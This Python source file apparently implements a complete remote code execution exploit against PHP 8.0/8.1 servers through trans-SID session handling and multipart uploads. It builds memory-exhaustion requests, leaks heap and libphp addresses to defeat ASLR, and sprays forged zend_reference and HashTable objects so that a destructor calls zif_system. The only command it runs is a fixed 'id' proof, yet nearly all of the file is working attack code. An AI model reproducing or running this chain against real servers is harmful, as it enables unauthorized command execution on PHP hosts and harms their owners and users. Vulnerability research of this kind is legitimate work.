#!/usr/bin/env python3
"""Exact-profile PHP 8.1 trans-SID A1/B1/A2/B2 research engine.

The engine has no command-line or target controls.  It is reached only after
the framework has accepted a verified exact-build profile and a private local
target manifest.  Its only terminal action is the fixed ``id>/out/p`` proof.

The 160 MiB A2 scalar is emitted as a bounded iterator so the client never
materializes it in memory.  Every allocator-relevant byte remains in the
profile, while the B1 parser independently verifies both disclosed bases
before B2 is built.
"""

from __future__ import annotations

import re
import struct
import time
import urllib.parse
from collections import Counter
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Iterable, Iterator, Mapping

from profile import Profile, ProfileError, parse_hex
from zend_payload import build_destructor_payload


FIXED_COMMAND = b"id>/out/p"
MIN_MMAP_POINTER = 0x0000100000000000
MAX_USER_POINTER = 0x00007FFFFFFFFFFF


def _is_user_pointer(value: int) -> bool:
    return MIN_MMAP_POINTER <= value <= MAX_USER_POINTER


def _proof(path: Path) -> str:
    try:
        value = path.read_text(encoding="utf-8", errors="replace").strip()
    except OSError:
        return ""
    return value if re.search(r"(?:^|\s)uid=\d+", value) else ""


def _series_name(prefix: str, index: int, digits: int, length: int, pad: bytes) -> bytes:
    seed = f"{prefix}{index:0{digits}d}".encode("ascii")
    return seed.ljust(length, pad)[:length]


class MultipartDocument:
    """Render the exact multipart bytes used by the PHP 8.1 profile."""

    def __init__(self, boundary: bytes):
        if not 1 <= len(boundary) <= 128 or not boundary.isascii():
            raise ProfileError("PHP 8.1 multipart boundary is invalid")
        self.boundary = boundary
        self._bytes = bytearray()

    @staticmethod
    def _token(value: bytes, label: str) -> bytes:
        if any(mark in value for mark in (b'"', b"\r", b"\n")):
            raise ProfileError(f"multipart {label} contains a forbidden byte")
        return value

    def field(
        self,
        name: bytes,
        value: bytes = b"",
        *,
        filename: bytes | None = None,
        content_type: bytes | None = None,
    ) -> None:
        name = self._token(name, "name")
        self._bytes += b"--" + self.boundary
        self._bytes += b'\r\nContent-Disposition: form-data; name="' + name + b'"'
        if filename is not None:
            self._bytes += b'; filename="' + self._token(filename, "filename") + b'"'
        self._bytes += b"\r\n"
        if content_type is not None:
            self._bytes += b"Content-Type: " + self._token(content_type, "content type") + b"\r\n"
        self._bytes += b"\r\n" + value + b"\r\n"

    def finish(self) -> bytes:
        self._bytes += b"--" + self.boundary + b"--\r\n"
        return bytes(self._bytes)


def _disposition(
    boundary: bytes,
    name: bytes,
    *,
    filename: bytes | None = None,
    content_type: bytes | None = None,
) -> bytes:
    """Build an A2 part header without retaining its value."""

    name = MultipartDocument._token(name, "name")
    output = b"--" + boundary + b'\r\nContent-Disposition: form-data; name="' + name + b'"'
    if filename is not None:
        output += b'; filename="' + MultipartDocument._token(filename, "filename") + b'"'
    output += b"\r\n"
    if content_type is not None:
        output += b"Content-Type: " + MultipartDocument._token(content_type, "content type") + b"\r\n"
    return output + b"\r\n"


def _http_body(response: bytes) -> bytes:
    """Return a framed HTTP response body, rejecting ambiguity/truncation."""

    header, marker, body = response.partition(b"\r\n\r\n")
    if not marker:
        raise ProfileError("PHP 8.1 B1 response has no HTTP header terminator")

    lines = header.split(b"\r\n")
    if not lines or not re.fullmatch(
        rb"HTTP/1\.[01] [0-9]{3}(?: [\t\x20-\x7e\x80-\xff]*)?", lines[0]
    ):
        raise ProfileError("PHP 8.1 B1 response has a malformed HTTP status line")

    fields: dict[bytes, list[bytes]] = {}
    for line in lines[1:]:
        name, separator, value = line.partition(b":")
        if (
            not separator
            or not re.fullmatch(rb"[!#$%&'*+\-.^_`|~0-9A-Za-z]+", name)
            or not re.fullmatch(rb"[\t\x20-\x7e\x80-\xff]*", value)
        ):
            raise ProfileError("PHP 8.1 B1 response has a malformed HTTP header")
        fields.setdefault(name.lower(), []).append(value.strip(b" \t"))

    transfers = fields.get(b"transfer-encoding", [])
    if len(transfers) > 1:
        raise ProfileError("PHP 8.1 B1 response has duplicate Transfer-Encoding")
    if transfers and not re.fullmatch(rb"chunked", transfers[0], re.I):
        raise ProfileError("PHP 8.1 B1 response has unsupported Transfer-Encoding")

    lengths = fields.get(b"content-length", [])
    if any(not re.fullmatch(rb"[0-9]+", value) for value in lengths):
        raise ProfileError("PHP 8.1 B1 response has a malformed Content-Length")
    if transfers and lengths:
        raise ProfileError("PHP 8.1 B1 response has ambiguous HTTP framing")
    if not transfers:
        if lengths:
            if len(set(lengths)) != 1:
                raise ProfileError("PHP 8.1 B1 response has conflicting Content-Length values")
            expected = int(lengths[0], 10)
            if len(body) != expected:
                raise ProfileError("PHP 8.1 B1 response body is truncated or overlong")
        return body

    output = bytearray()
    while body:
        line, marker, rest = body.partition(b"\r\n")
        if not marker:
            raise ProfileError("PHP 8.1 B1 response has a truncated chunk-size line")
        if not re.fullmatch(rb"[0-9A-Fa-f]+(?:;[\t\x20-\x7e\x80-\xff]*)?", line):
            raise ProfileError("PHP 8.1 B1 response has an invalid chunk size")
        try:
            size = int(line.split(b";", 1)[0], 16)
        except ValueError as exc:
            raise ProfileError("PHP 8.1 B1 response has an invalid chunk size") from exc
        if size == 0:
            if rest == b"\r\n":
                return bytes(output)
            if not rest.endswith(b"\r\n\r\n"):
                raise ProfileError(
                    "PHP 8.1 B1 response has a truncated or overlong HTTP trailer"
                )
            trailer = rest[:-4]
            if not trailer:
                raise ProfileError("PHP 8.1 B1 response has a malformed HTTP trailer")
            for trailer_line in trailer.split(b"\r\n"):
                name, separator, value = trailer_line.partition(b":")
                if (
                    not separator
                    or not re.fullmatch(rb"[!#$%&'*+\-.^_`|~0-9A-Za-z]+", name)
                    or not re.fullmatch(rb"[\t\x20-\x7e\x80-\xff]*", value)
                    or name.lower() in (b"content-length", b"transfer-encoding", b"trailer")
                ):
                    raise ProfileError("PHP 8.1 B1 response has a malformed HTTP trailer")
            return bytes(output)
        if len(rest) < size + 2 or rest[size:size + 2] != b"\r\n":
            raise ProfileError("PHP 8.1 B1 response has truncated chunk data")
        output += rest[:size]
        body = rest[size + 2:]
    raise ProfileError("trans-SID B1 response has no terminal HTTP chunk")


@dataclass(frozen=True)
class Php81Disclosure:
    """Addresses accepted from one exact B1 trans-SID disclosure."""

    main_chunk: int
    libphp_base: int
    zval_ptr_dtor: int
    dtor_hits: int
    leak_length: int


class Php81TransSidExploit:
    """Build and execute an exact profile-bound PHP 8.0/8.1 sequence."""

    def __init__(self, target: Any, profile: Profile, command: bytes):
        if profile.strategy != "php81-trans-sid-v1":
            raise ProfileError("PHP 8.x trans-SID engine received the wrong strategy")
        if command != FIXED_COMMAND:
            raise ProfileError("PHP 8.x trans-SID engine accepts only id>/out/p")
        self.target = target
        self.profile = profile
        self.command = command
        self.recipe = profile.raw["request_recipe"]
        self.runtime = profile.raw["runtime"]
        self.abi = profile.raw["abi"]
        self.php_version = profile.raw["build"]["php"]["version"]
        self.page_size = parse_hex(self.abi["page_size"], "abi.page_size")
        self.chunk_size = parse_hex(
            self.abi["zend_mm_chunk_size"], "abi.zend_mm_chunk_size"
        )
        self.dtor_offset = profile.hx("symbols", "zval_ptr_dtor", "offset")
        self.zif_offset = profile.hx("symbols", "zif_system", "offset")

    @staticmethod
    def _nested_name(index: int, depth: int, key_pad: int) -> bytes:
        stem = f"files[R{index:05d}{'K' * key_pad}]".encode("ascii")
        return stem + b"[a]" * (depth - 2)

    def query(self) -> str:
        return "&".join(f"q{index}=v" for index in range(int(self.recipe["query_fields"])))

    def build_a1(self) -> tuple[bytes, bytes, str]:
        """Build the FILE_START OOM producer byte-for-byte from the profile."""

        spec = self.recipe["a1"]
        boundary = b"C" * int(spec["boundary_len"])
        document = MultipartDocument(boundary)
        document.field(self.runtime["session_name"].encode("ascii"), b"\x00")

        ctype_lengths = tuple(int(value) for value in spec["ctype_lengths"])
        for index in range(int(spec["nested_parts"])):
            name = self._nested_name(index, int(spec["depth"]), int(spec["key_pad"]))
            if index < len(ctype_lengths):
                filename = b"A"
                content_type = b"C" * ctype_lengths[index]
            else:
                filename = b""
                content_type = b"application/octet-stream"
            document.field(name, filename=filename, content_type=content_type)

        small = spec["small_fillers"]
        for index in range(int(small["count"])):
            name = _series_name("f", index, 4, int(small["name_len"]), b"x")
            document.field(name, b"v" * int(small["value_len"]))

        large = spec["large_fields"]
        for index in range(int(large["count"])):
            document.field(
                _series_name("b", index, 4, 5, b"b"),
                b"B" * int(large["value_len"]),
            )

        burners = spec["burners"]
        for index in range(int(burners["count"])):
            document.field(
                _series_name("u", index, 2, 3, b"u"),
                b"U" * int(burners["value_len"]),
            )

        pad = spec["pad"]
        document.field(
            b"p" * int(pad["name_len"]), b"P" * int(pad["value_len"])
        )
        document.field(
            self.runtime["upload_progress_name"].encode("ascii"),
            b"k" * int(spec["progress_len"]),
        )

        for group in spec["pre_file_scalars"]:
            prefix = str(group["prefix"])
            fill = str(group["fill"]).encode("ascii")
            if len(fill) != 1:
                raise ProfileError("a1.pre_file_scalars fill must be one ASCII byte")
            for index in range(int(group["count"])):
                name = _series_name(
                    prefix,
                    index,
                    3,
                    int(group["name_len"]),
                    prefix.encode("ascii"),
                )
                document.field(name, fill * int(group["value_len"]))

        for index, raw_length in enumerate(spec["pre_file_mix"]):
            document.field(f"m{index:03d}".encode("ascii"), b"M" * int(raw_length))

        file_spec = spec["file"]
        document.field(
            b"q" * int(file_spec["name_len"]),
            b"D" * int(file_spec["value_len"]),
            filename=b"n" * int(file_spec["filename_len"]),
            content_type=b"T" * int(file_spec["content_type_len"]),
        )
        return document.finish(), boundary, self.query()

    @staticmethod
    def _tag(index: int) -> bytes:
        return b"/" + f"{index % 100:02d}".encode("ascii") + b"BBBBB"

    def _forge_b1_value(self, pages: int, index: int) -> bytes:
        spec = self.recipe["b1"]
        length = pages * self.page_size - int(spec["allocator_overhead"])
        value = bytearray(b"A" * length)
        header = parse_hex(spec["target_offset"], "b1.target_offset") - int(
            spec["value_data_offset"]
        )
        if header < 0 or header + 0x20 > length:
            raise ProfileError("PHP 8.1 B1 fake zend_string falls outside its carrier")
        struct.pack_into(
            "<IIQQ",
            value,
            header,
            0,
            0x16,
            0,
            parse_hex(spec["fake_len"], "b1.fake_len"),
        )
        value[header + 0x18:header + 0x20] = self._tag(index)
        return bytes(value)

    def _plain_b1_value(self, pages: int) -> bytes:
        spec = self.recipe["b1"]
        length = pages * self.page_size - int(spec["allocator_overhead"])
        return b"A" * length

    def build_b1(self) -> tuple[bytes, bytes, str]:
        """Build 13 forged fields, F400, two forged fields, and X900."""

        spec = self.recipe["b1"]
        boundary = b"C" * int(spec["boundary_len"])
        document = MultipartDocument(boundary)
        document.field(self.runtime["session_name"].encode("ascii"), b"a")
        document.field(self.runtime["upload_progress_name"].encode("ascii"), b"k0")
        name_len = int(spec["name_len"])
        index = 0

        for _ in range(int(spec["head_forged_fields"])):
            name = _series_name("f", index, 4, name_len, b"f")
            document.field(name, self._forge_b1_value(int(spec["forged_pages"]), index))
            index += 1

        name = _series_name("f", index, 4, name_len, b"f")
        document.field(name, self._plain_b1_value(int(spec["partial_flood_pages"])))
        index += 1

        for _ in range(int(spec["tail_forged_fields"])):
            name = _series_name("f", index, 4, name_len, b"f")
            document.field(name, self._forge_b1_value(int(spec["forged_pages"]), index))
            index += 1

        for _ in range(int(spec["nested_fillers"])):
            document.field(f"x{index:05d}".encode("ascii") + b"[a]" * 12, b"v")
            index += 1
        return document.finish(), boundary, self.query()

    def extract_b1_leak(self, response: bytes) -> bytes:
        """Extract and percent-decode the trans-SID from a complete response."""

        body = _http_body(response)
        session_name = re.escape(self.runtime["session_name"].encode("ascii"))
        match = re.search(rb"[?&]" + session_name + rb"=([^\"&<]*)", body)
        if not match:
            raise ProfileError("PHP 8.1 B1 response contains no trans-SID disclosure")
        try:
            return urllib.parse.unquote_to_bytes(match.group(1).decode("latin1"))
        except UnicodeError as exc:
            raise ProfileError("PHP 8.1 B1 trans-SID could not be decoded") from exc

    def parse_b1_leak(self, leak: bytes) -> Php81Disclosure:
        """Validate an already decoded B1 leak and recover both bases."""

        spec = self.recipe["b1"]
        try:
            expected_prefix = str(spec["expected_prefix"]).encode("ascii")
        except UnicodeError as exc:
            raise ProfileError("b1.expected_prefix must be ASCII") from exc
        if not leak.startswith(expected_prefix):
            raise ProfileError("PHP 8.1 B1 hit tag does not match /14BBBBB")
        expected_length = parse_hex(spec["fake_len"], "b1.fake_len")
        if len(leak) != expected_length:
            raise ProfileError(
                f"PHP 8.1 B1 disclosure length is 0x{len(leak):x}, "
                f"expected 0x{expected_length:x}"
            )

        main_offset = parse_hex(spec["main_qword_offset"], "b1.main_qword_offset")
        if main_offset + 8 > len(leak):
            raise ProfileError("PHP 8.1 B1 disclosure is too short for the main qword")
        heap_slot = struct.unpack_from("<Q", leak, main_offset)[0]
        if not _is_user_pointer(heap_slot):
            raise ProfileError("PHP 8.1 B1 main qword is not a userspace pointer")
        main_chunk = heap_slot - 0x40
        if not _is_user_pointer(main_chunk) or main_chunk % self.chunk_size:
            raise ProfileError("PHP 8.1 B1 main qword is not main_chunk+0x40")

        pointers = Counter(
            struct.unpack_from("<Q", leak, offset)[0]
            for offset in range(0, len(leak) - 7, 8)
        )
        strong: list[tuple[int, int, int]] = []
        minimum = int(spec["min_dtor_hits"])
        for pointer, hits in pointers.items():
            if hits < minimum or not _is_user_pointer(pointer):
                continue
            if pointer < self.dtor_offset:
                continue
            libphp = pointer - self.dtor_offset
            if _is_user_pointer(libphp) and libphp % self.page_size == 0:
                strong.append((hits, pointer, libphp))
        if len(strong) != 1:
            raise ProfileError(
                "PHP 8.1 B1 zval_ptr_dtor fingerprint is not unique at the profiled threshold"
            )
        hits, destructor, libphp = strong[0]

        delta = libphp - main_chunk
        delta_lo = parse_hex(spec["libphp_delta_min"], "b1.libphp_delta_min")
        delta_hi = parse_hex(spec["libphp_delta_max"], "b1.libphp_delta_max")
        if not delta_lo <= delta <= delta_hi:
            raise ProfileError("PHP 8.1 B1 libphp/main delta is outside the profile")
        return Php81Disclosure(main_chunk, libphp, destructor, hits, len(leak))

    def parse_b1(self, response: bytes) -> Php81Disclosure:
        """Parse one complete HTTP B1 response."""

        return self.parse_b1_leak(self.extract_b1_leak(response))

    def iter_a2(self) -> Iterator[bytes]:
        """Yield the exact 160 MiB OOM producer in at most 64 KiB values."""

        spec = self.recipe["a2"]
        boundary = b"S" * int(spec["boundary_len"])
        session_name = self.runtime["session_name"].encode("ascii")
        progress_name = self.runtime["upload_progress_name"].encode("ascii")

        yield _disposition(boundary, session_name)
        yield b"a" * int(spec["session_value_len"])
        yield b"\r\n"
        yield _disposition(boundary, progress_name)
        yield str(spec["progress_value"]).encode("ascii")
        yield b"\r\n"

        fillers = spec["fillers"]
        for index in range(int(fillers["count"])):
            name = f"p{index:06d}".encode("ascii")[: int(fillers["name_len"])]
            yield _disposition(boundary, name)
            yield b"V" * int(fillers["value_len"])
            yield b"\r\n"

        file_spec = spec["file"]
        yield _disposition(
            boundary,
            str(file_spec["name"]).encode("ascii"),
            filename=str(file_spec["filename"]).encode("ascii"),
            content_type=b"application/octet-stream",
        )
        yield b"A" * int(file_spec["value_len"])
        yield b"\r\n"

        large = spec["large_field"]
        yield _disposition(boundary, str(large["name"]).encode("ascii"))
        block_size = int(large["stream_chunk"])
        block = b"B" * block_size
        remaining = int(large["value_len"])
        while remaining:
            size = min(remaining, block_size)
            yield block if size == block_size else block[:size]
            remaining -= size
        yield b"\r\n--" + boundary + b"--\r\n"

    def build_a2(self) -> tuple[Iterable[bytes], bytes]:
        spec = self.recipe["a2"]
        boundary = b"S" * int(spec["boundary_len"])
        return self.iter_a2(), boundary

    def build_b2_value(self, index: int, main_chunk: int, libphp: int) -> bytes:
        """Build one exact 4071-byte reference/HashTable reclaim carrier."""

        spec = self.recipe["b2"]
        if main_chunk % self.chunk_size or libphp % self.page_size:
            raise ProfileError("PHP 8.1 B2 bases are not profile-aligned")
        reference_offset = parse_hex(spec["reference_offset"], "b2.reference_offset")
        fake_offset = parse_hex(spec["fake_array_offset"], "b2.fake_array_offset")
        if reference_offset & ~(self.page_size - 1) != fake_offset & ~(self.page_size - 1):
            raise ProfileError("PHP 8.1 B2 reference and HashTable must share one page")

        zstring_val = parse_hex(self.abi["zend_string"]["val"], "zend_string.val")
        zref = {
            key: parse_hex(value, f"zend_reference.{key}")
            for key, value in self.abi["zend_reference"].items()
        }
        zval = {
            key: parse_hex(value, f"zval.{key}")
            for key, value in self.abi["zval"].items()
        }
        types = {
            key: parse_hex(value, f"types.{key}")
            for key, value in self.abi["types"].items()
        }
        reference_in_value = (reference_offset & (self.page_size - 1)) - zstring_val
        table_in_value = (fake_offset & (self.page_size - 1)) - zstring_val
        ht_address = main_chunk + fake_offset
        destructor = libphp + self.zif_offset
        table = bytearray(
            build_destructor_payload(self.abi, ht_address, destructor, self.command)
        )
        # The reproduced 8.1 carrier also marks the execute-data overlay at
        # zend_array.table_size + zval.type_info as IS_STRING.  This byte is
        # the sole layout difference from the shared 8.2+ encoder.
        execute_base = parse_hex(
            self.abi["zend_array"]["table_size"], "zend_array.table_size"
        )
        struct.pack_into(
            "<I", table, execute_base + zval["type_info"], types["is_string"]
        )
        value = bytearray(b"." * int(spec["value_len"]))
        value[0:8] = b"SPRAY%03d" % (index % 1000)

        writes = (
            ("<I", reference_in_value + zref["gc"], int(spec["refcount"])),
            ("<I", reference_in_value + zref["gc"] + 4, types["is_reference"]),
            ("<Q", reference_in_value + zref["val"] + zval["value"], ht_address),
            # The successful PHP 8.1 carrier zeroed the whole zval type/aux
            # qword, rather than leaving the four auxiliary bytes as fill.
            ("<Q", reference_in_value + zref["val"] + zval["type_info"], types["array_ex"]),
            ("<Q", reference_in_value + zref["sources"], 0),
        )
        for fmt, offset, number in writes:
            try:
                struct.pack_into(fmt, value, offset, number)
            except struct.error as exc:
                raise ProfileError("PHP 8.1 B2 reference falls outside its carrier") from exc
        if table_in_value < 0 or table_in_value + len(table) > len(value):
            raise ProfileError("PHP 8.1 B2 HashTable falls outside its carrier")
        value[table_in_value:table_in_value + len(table)] = table
        return bytes(value)

    def build_b2(self, main_chunk: int, libphp: int) -> tuple[bytes, bytes]:
        spec = self.recipe["b2"]
        boundary = b"B" * int(spec["boundary_len"])
        document = MultipartDocument(boundary)
        document.field(
            self.runtime["session_name"].encode("ascii"),
            str(spec["session_value"]).encode("ascii"),
        )
        document.field(
            self.runtime["upload_progress_name"].encode("ascii"),
            str(spec["progress_value"]).encode("ascii"),
        )
        for index in range(int(spec["spray_count"])):
            name = _series_name("s", index, 3, int(spec["name_len"]), b"s")
            document.field(name, self.build_b2_value(index, main_chunk, libphp))
        return document.finish(), boundary

    def run(self, proof: Path, retries: int) -> int:
        for attempt in range(1, retries + 1):
            self.target.log(
                f"[*] PHP {self.php_version} trans-SID A1 ({attempt}/{retries})"
            )
            a1, a1_boundary, query = self.build_a1()
            self.target.post_chunked(
                a1, a1_boundary, query=query, read_cap=1 << 20, timeout=180.0
            )
            del a1
            time.sleep(0.2)

            self.target.log(
                f"[*] PHP {self.php_version} trans-SID B1 ({attempt}/{retries})"
            )
            b1, b1_boundary, query = self.build_b1()
            fake_len = parse_hex(self.recipe["b1"]["fake_len"], "b1.fake_len")
            response = self.target.post_chunked(
                b1,
                b1_boundary,
                query=query,
                read_cap=max(4 << 20, fake_len * 3 + (1 << 20)),
                timeout=600.0,
            )
            del b1
            try:
                disclosure = self.parse_b1(response)
            except ProfileError as exc:
                self.target.log(f"[-] PHP {self.php_version} B1 rejected: {exc}")
                continue
            self.target.log(
                f"[+] PHP {self.php_version} B1 disclosed "
                f"0x{disclosure.leak_length:x} bytes; "
                f"main=0x{disclosure.main_chunk:x}; libphp=0x{disclosure.libphp_base:x}; "
                f"dtor_hits={disclosure.dtor_hits}"
            )

            self.target.log(
                f"[*] PHP {self.php_version} trans-SID A2 "
                "(streaming 160 MiB scalar)"
            )
            a2_chunks, a2_boundary = self.build_a2()
            self.target.post_chunked_iter(
                a2_chunks, a2_boundary, read_cap=1 << 20, timeout=240.0
            )
            time.sleep(0.3)

            self.target.log(
                f"[*] PHP {self.php_version} trans-SID B2 "
                "(fixed id>/out/p proof)"
            )
            b2, b2_boundary = self.build_b2(
                disclosure.main_chunk, disclosure.libphp_base
            )
            self.target.post(b2, b2_boundary, read_cap=1 << 20, timeout=120.0)
            del b2
            time.sleep(0.8)
            result = _proof(proof)
            if result:
                print(f"PROOF: {result}")
                return 0
        raise ProfileError("php81-trans-sid-v1 produced no uid proof in its exact profile")


def run_php81_trans_sid(
    target: Any,
    profile: Profile,
    command: bytes,
    proof: Path,
    retries: int,
) -> int:
    return Php81TransSidExploit(target, profile, command).run(proof, retries)
